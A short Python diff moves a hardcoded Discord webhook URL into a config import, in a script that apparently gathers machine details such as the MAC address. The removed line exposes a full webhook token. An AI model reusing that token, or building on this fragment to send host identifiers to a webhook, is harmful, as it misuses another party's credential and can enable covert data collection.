@@ -1,6 +1,5 @@
 import requests, wmi, subprocess, psutil, platform, json
-
-hook = "https://discord.com/api/webhooks/1073970412322566175/HtYFF6lf77URUMpHJPH-egvs0iOSEsYV6yXuuPmw3QGvXG1A_rJRFYX3z9p6jYcRrjgl"
+from config import hook
 
 def get_mac_address():
     for interface, addrs in psutil.net_if_addrs().items():
